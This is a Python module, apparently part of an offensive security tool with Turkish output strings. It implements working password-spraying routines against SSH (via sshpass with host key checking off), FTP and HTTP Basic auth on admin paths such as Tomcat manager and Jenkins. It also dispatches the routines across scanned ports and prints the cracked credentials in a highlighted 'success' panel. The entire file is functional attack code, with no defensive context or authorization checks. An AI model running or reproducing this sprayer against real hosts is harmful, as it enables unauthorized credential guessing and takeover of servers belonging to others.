import socket
import subprocess
import time
import ftplib
import urllib.request
import urllib.error
import base64
from dataclasses import dataclass, field

@dataclass
class SprayResult:
    host: str
    port: str
    service: str
    user: str
    password: str
    success: bool = False


def _spray_ssh(host: str, port: int, users: list[str], passwords: list[str],
               delay: float = 2.0) -> list[SprayResult]:
    results = []
    for password in passwords:
        for user in users:
            try:
                proc = subprocess.run(
                    ["sshpass", "-p", password, "ssh",
                     "-o", "StrictHostKeyChecking=no",
                     "-o", "ConnectTimeout=4",
                     "-o", "BatchMode=no",
                     "-p", str(port),
                     f"{user}@{host}", "echo ok"],
                    capture_output=True, text=True, timeout=8,
                )
                if "ok" in proc.stdout:
                    results.append(SprayResult(host, str(port), "ssh", user, password, True))
                    return results
            except FileNotFoundError:
                return []
            except Exception:
                pass
            time.sleep(delay)
    return results


def _spray_ftp(host: str, port: int, users: list[str], passwords: list[str],
               delay: float = 1.0) -> list[SprayResult]:
    results = []
    for user in users:
        for password in passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(host, port, timeout=5)
                ftp.login(user, password)
                ftp.quit()
                results.append(SprayResult(host, str(port), "ftp", user, password, True))
                return results
            except ftplib.error_perm:
                pass
            except Exception:
                break
            time.sleep(delay)
    return results


def _spray_http(host: str, port: int, use_ssl: bool, users: list[str],
                passwords: list[str], delay: float = 1.0) -> list[SprayResult]:
    results = []
    scheme = "https" if use_ssl else "http"
    base = f"{scheme}://{host}" if port in (80, 443) else f"{scheme}://{host}:{port}"
    paths = ["/manager/html", "/admin", "/jenkins", "/login", "/"]

    for user in users:
        for password in passwords:
            token = base64.b64encode(f"{user}:{password}".encode()).decode()
            for path in paths:
                try:
                    req = urllib.request.Request(
                        base + path,
                        headers={"Authorization": f"Basic {token}", "User-Agent": "Mozilla/5.0"},
                    )
                    with urllib.request.urlopen(req, timeout=5) as resp:
                        if resp.status == 200:
                            results.append(SprayResult(host, str(port), "http", user, password, True))
                            return results
                except Exception:
                    pass
            time.sleep(delay)
    return results


SERVICE_SPRAYERS = {
    "ssh":     _spray_ssh,
    "ftp":     _spray_ftp,
    "http":    lambda h, p, u, pw, d: _spray_http(h, p, False, u, pw, d),
    "https":   lambda h, p, u, pw, d: _spray_http(h, p, True, u, pw, d),
    "tomcat":  lambda h, p, u, pw, d: _spray_http(h, p, False, u, pw, d),
    "jenkins": lambda h, p, u, pw, d: _spray_http(h, p, False, u, pw, d),
}


def run_spray(host: str, ports, userlist: list[str], passlist: list[str],
              delay: float = 2.0) -> list[SprayResult]:
    all_results = []
    for port in ports:
        svc = port.service.lower()
        fn = None
        for key, sprayer in SERVICE_SPRAYERS.items():
            if key in svc:
                fn = sprayer
                break
        if not fn:
            continue
        try:
            results = fn(host, int(port.number), userlist, passlist, delay)
            all_results.extend(results)
        except Exception:
            continue
    return all_results


def print_spray_results(results: list[SprayResult], console) -> None:
    from rich.table import Table
    from rich import box
    from rich.panel import Panel
    from rich.text import Text

    hits = [r for r in results if r.success]
    if not hits:
        console.print("[dim]Password spray: geçerli credential bulunamadı[/dim]")
        return

    table = Table("Servis", "Port", "Kullanıcı", "Şifre",
                  box=box.SIMPLE_HEAD, border_style="red", header_style="bold red")
    for r in hits:
        table.add_row(r.service, r.port,
                      Text(r.user, style="bold green"),
                      Text(r.password, style="bold green"))

    console.print(Panel(table, title=f"[bold red]💥 SPRAY BAŞARILI — {len(hits)} HIT[/bold red]",
                        border_style="red", box=box.ROUNDED))
